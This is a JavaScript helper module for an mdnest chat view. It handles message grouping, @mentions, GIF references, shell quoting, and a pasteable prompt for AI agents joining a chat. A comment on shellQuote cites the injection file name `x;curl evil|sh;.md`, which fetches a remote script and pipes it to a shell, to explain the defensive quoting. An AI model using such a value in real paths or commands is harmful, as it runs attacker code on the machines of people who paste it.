// File-based chat — pure helpers, no React, no window. ChatView.jsx is a thin
// renderer over these.
//
// The chat itself is a note (backend/handlers/chat_markdown.go owns the
// format); this module only decides how the web UI names, colours, groups and
// polls it.

// isChatDoc mirrors the backend's IsChatNote: leading frontmatter with
// `mdnest-chat: true`. Same frontmatter grammar as isMarpDoc (marp.js).
export function isChatDoc(content) {
  if (typeof content !== 'string') return false;
  const m = content.match(/^\uFEFF?---\r?\n([\s\S]*?)\r?\n---[ \t]*(\r?\n|$)/);
  if (!m) return false;
  return /^mdnest-chat[ \t]*:[ \t]*["']?true["']?[ \t]*$/im.test(m[1]);
}

// Poll cadence. The chat view does not depend on the live-collab websocket
// (off by default, multi mode only), so polling is the one mechanism that
// works on every install. Reads are cheap: `after=N` returns only new posts.
export const CHAT_POLL_MS = 3000;
export const CHAT_LIST_POLL_MS = 15000;

// Consecutive messages from one author inside this window share a header,
// like every chat app — a run of short agent updates reads as one turn.
export const GROUP_WINDOW_MS = 5 * 60 * 1000;

// Default folder a new chat lands in, inside the chosen namespace.
export const DEFAULT_CHAT_FOLDER = 'Chats';

// slugify turns a channel name into a filename. Deliberately conservative
// (lowercase ascii, digits, dashes): the path is what agents get handed, so
// it should survive a shell and a URL without quoting.
export function slugify(title) {
  const s = String(title || '')
    .normalize('NFKD')
    .replace(/[̀-ͯ]/g, '')
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '')
    .slice(0, 60)
    .replace(/-+$/g, '');
  return s || 'chat';
}

// chatPathFor builds the note path for a new chat: <folder>/<slug>.md.
export function chatPathFor(title, folder = DEFAULT_CHAT_FOLDER) {
  const dir = String(folder || '').replace(/^\/+|\/+$/g, '');
  const file = `${slugify(title)}.md`;
  return dir ? `${dir}/${file}` : file;
}

// Author colours are theme tokens, never literals (theme-tokens.test.js), so
// a name keeps a readable colour in both light and dark mode.
export const AUTHOR_COLORS = ['--accent', '--success', '--orange', '--pink', '--purple', '--info', '--lavender', '--warning'];

// colorForAuthor is stable per name: the same agent is the same colour in
// every chat and after every reload.
export function colorForAuthor(name) {
  let h = 0;
  for (const ch of String(name || '')) h = (h * 31 + ch.codePointAt(0)) >>> 0;
  return AUTHOR_COLORS[h % AUTHOR_COLORS.length];
}

// isOwnMessage: was this posted by me, under the name I am posting as now?
// `account` is my login (multi mode; null in single mode) and `postingAs` the
// label on my posts. The server writes a label that differs from the account
// as "label (via account)", so an agent running on my token as `claude-a` is
// NOT me — it renders on the other side, as its own voice.
export function isOwnMessage(msg, account, postingAs) {
  if (!msg || !postingAs) return false;
  const expectedVia = account && postingAs !== account ? account : '';
  return msg.author === postingAs && (msg.via || '') === expectedVia;
}

// groupMessages marks which messages start a new visual group.
export function groupMessages(messages) {
  let prev = null;
  return (messages || []).map((m) => {
    const t = Date.parse(m.time);
    const startsGroup = !prev
      || prev.author !== m.author
      || prev.via !== m.via
      || !(t - Date.parse(prev.time) <= GROUP_WINDOW_MS);
    prev = m;
    return { ...m, startsGroup };
  });
}

// mergeMessages appends a polled batch without duplicating anything already
// shown (a poll and a just-sent post can both deliver the same #N).
export function mergeMessages(current, incoming) {
  const seen = new Set((current || []).map((m) => m.n));
  const add = (incoming || []).filter((m) => !seen.has(m.n));
  if (add.length === 0) return current || [];
  return [...(current || []), ...add].sort((a, b) => a.n - b.n);
}

// plainPreview flattens a message for the one-line list preview: the list
// shows text, not rendered markdown, so the emphasis/code markers would
// otherwise appear literally ("**Shipping**").
export function plainPreview(text) {
  return String(text || '')
    .replace(/```[\s\S]*?(```|$)/g, ' [code] ')
    .replace(/!\[[^\]]*\]\([^)]*\)/g, '[image]')
    .replace(/\[([^\]]*)\]\([^)]*\)/g, '$1')
    .replace(/[*_`~#>]+/g, '')
    .replace(/\s+/g, ' ')
    .trim();
}

// formatChatTime: time only for today, date + time otherwise.
export function formatChatTime(iso, now = new Date()) {
  const d = new Date(iso);
  if (Number.isNaN(d.getTime())) return '';
  const time = d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  if (d.toDateString() === now.toDateString()) return time;
  return `${d.toLocaleDateString([], { day: 'numeric', month: 'short' })} ${time}`;
}

// shellQuote single-quotes a word unless it is made only of characters no
// shell gives meaning to. A chat path is chosen by whoever created the note,
// which in a shared workspace is not the person pasting the snippet, so a
// name like `x;curl evil|sh;.md` must reach the shell as one inert word.
export function shellQuote(word) {
  const w = String(word);
  if (/^[A-Za-z0-9@%+=:,./_-]+$/.test(w)) return w;
  return `'${w.replace(/'/g, `'\\''`)}'`;
}

// --- chat images -----------------------------------------------------------
// A message names an image with ![nod](gif:nod). The list the server returns
// (/api/chat/gifs) already applies the precedence: the workspace's own
// ChatGifs/nod.* first, otherwise the built-in that ships with mdnest. A
// namespace-relative path (![x](ChatGifs/x.svg)) also still works.
export const CHAT_GIF_DIR = 'ChatGifs';

// expandGifRefs rewrites ](gif:NAME) to ](URL) before the markdown is
// rendered (DOMPurify would drop an unknown "gif:" scheme), using urlFor to
// turn a listed image into a URL. An unknown name becomes plain text, so a
// typo reads as a typo rather than a broken image.
export function expandGifRefs(text, gifs, urlFor) {
  return String(text || '').replace(/!\[([^\]]*)\]\(gif:([\w.-]+)\)/g, (all, alt, name) => {
    const g = (gifs || []).find((x) => x.name.toLowerCase() === name.toLowerCase());
    return g ? `![${alt}](${urlFor(g)})` : `\`:${name}:\``;
  });
}

// avatarFor finds the poster's avatar-NAME.* in the library (case-insensitive).
export function avatarFor(gifs, author) {
  const want = String(author || '').toLowerCase();
  if (!want) return null;
  return (gifs || []).find((g) => (g.avatar || '').toLowerCase() === want) || null;
}

// reactions: the library minus avatars, for the picker.
export function reactions(gifs) {
  return (gifs || []).filter((g) => !g.avatar);
}

export function gifMarkdown(g) {
  return `![${g.name}](gif:${g.name})`;
}

// --- @mentions ---------------------------------------------------------
// Same grammar as the backend's ChatMentions (chat_markdown.go): an @ at the
// start or after a non-word character (so an email is not a mention), then a
// name. @all / @everyone address everyone.
const MENTION_RE = /(^|[^\w@])@([A-Za-z0-9_][\w.-]*)/g;
const BROADCAST = new Set(['all', 'everyone']);

function cleanName(raw) {
  return raw.replace(/[.-]+$/, '');
}

// mentionsName: does this text address name (directly, or via @all)?
export function mentionsName(text, name) {
  const want = String(name || '').trim().toLowerCase();
  if (!want) return false;
  for (const m of String(text || '').matchAll(MENTION_RE)) {
    const got = cleanName(m[2]).toLowerCase();
    if (got === want || BROADCAST.has(got)) return true;
  }
  return false;
}

// highlightMentions wraps @name in a span before the markdown is rendered.
// Code is left alone: inside a fence or `inline code` an @ is literal text.
// The span survives sanitizeHtml (class and data-* are kept by design).
export function highlightMentions(text) {
  const parts = String(text || '').split(/(```[\s\S]*?(?:```|$)|`[^`\n]*`)/g);
  return parts.map((part, i) => {
    if (i % 2 === 1) return part; // a code span or fence
    return part.replace(MENTION_RE, (all, pre, raw) => {
      const name = cleanName(raw);
      const tail = raw.slice(name.length);
      return `${pre}<span class="chat-mention" data-mention="${name.toLowerCase()}">@${name}</span>${tail}`;
    });
  }).join('');
}

// participants: everyone who has posted, most recent first, for @-completion.
export function participants(messages) {
  const seen = new Map();
  for (const m of messages || []) seen.set(m.author, m.n);
  return [...seen.entries()].sort((a, b) => b[1] - a[1]).map(([name]) => name);
}

// mentionQuery: if the caret sits right after "@abc", return "abc" (the
// word being typed), else null.
export function mentionQuery(text, caret) {
  const before = String(text || '').slice(0, caret);
  const m = before.match(/(?:^|[^\w@])@([\w.-]*)$/);
  return m ? m[1] : null;
}

// completeMention replaces the "@abc" before the caret with "@name ".
export function completeMention(text, caret, name) {
  const before = text.slice(0, caret);
  const after = text.slice(caret);
  const start = before.lastIndexOf('@');
  const head = before.slice(0, start) + '@' + name + ' ';
  return { text: head + after, caret: head.length };
}

// The prompt shown in a chat's "Connect an agent" panel, to paste into an
// agent as-is. Two lessons are built in:
//   - one name, used on EVERY command. A literal `--as my-agent` in the old
//     snippet is what agents posted as, whatever they were told they were
//     called, and mentions only reach the name an agent actually uses;
//   - an explicit loop. Some agents (Codex) end their turn once the listed
//     commands are done, so "wait, reply, wait again, never stop" has to be
//     spelled out, with short timeouts for tools that kill long commands.
// It must stay pasteable (pasteable-commands.test.js): no <angle-bracket>
// stand-ins, and the target is shell-quoted whenever it needs to be.
export function agentInstructions(alias, ns, path, name = 'AGENT_NAME') {
  const target = shellQuote(`${alias ? `@${alias}/` : ''}${ns}/${path}`);
  const nsTarget = shellQuote(`${alias ? `@${alias}/` : ''}${ns}`);
  const as = shellQuote(name);
  return [
    `You are ${name} in an mdnest chat. Use --as ${as} on EVERY command, and only that name.`,
    '',
    '1. Read the WHOLE conversation before you say anything:',
    `   mdnest chat read ${target} --as ${as}`,
    '   The first line lists who is here. Work out: who each participant is and what they',
    `   are doing, what is being worked on, what has been decided, and anything addressed`,
    `   to @${name} or still waiting for an answer.`,
    '2. Introduce yourself in ONE message that shows you read it: who you are, what you',
    '   understood is going on, how you can help, and answers to anything waiting for you.',
    `   mdnest chat post ${target} "..." --as ${as}`,
    '3. Then loop, and do not end your turn while you are in the chat:',
    `   mdnest chat wait ${target} --as ${as} --timeout 120`,
    '   - exit 0: new messages were printed. Reply with chat post (same --as), then wait again.',
    '   - exit 2: nothing new yet. Run the same wait again.',
    `   It never returns your own posts, and nothing posted while you work is lost.`,
    `   Add --mentions to wake only when someone writes @${name} (or @all).`,
    `   Lost the thread? Re-read everything with: mdnest chat read ${target}`,
    '   (without --as, so your place in the chat does not move).',
    '',
    `Your look (optional, but it helps people tell agents apart). See every image you can use`,
    `(the set that ships with mdnest, plus this workspace's ${CHAT_GIF_DIR}/):  mdnest chat gifs ${nsTarget}`,
    `- If there is no avatar-${name}.* yet, make one: a small animated SVG (about 64x64, under`,
    '  20 KB, shapes plus SVG animate elements or CSS animation, no scripts, no external links)',
    '  that suits your role, write it to avatar.svg, and save it:',
    `  cat avatar.svg | mdnest create ${nsTarget}/${CHAT_GIF_DIR}/avatar-${name}.svg -`,
    `- React by name: mdnest chat post ${target} "![nod](gif:nod)" --as ${as}`,
    `- Made a reaction worth reusing? Save it to ${CHAT_GIF_DIR}/ under a short name so everyone`,
    '  in this workspace can use it. The same name as a built-in replaces it here.',
    '',
    'Address people with @name. Post a short "on it: ..." before long work, then the result.',
  ].join('\n');
}
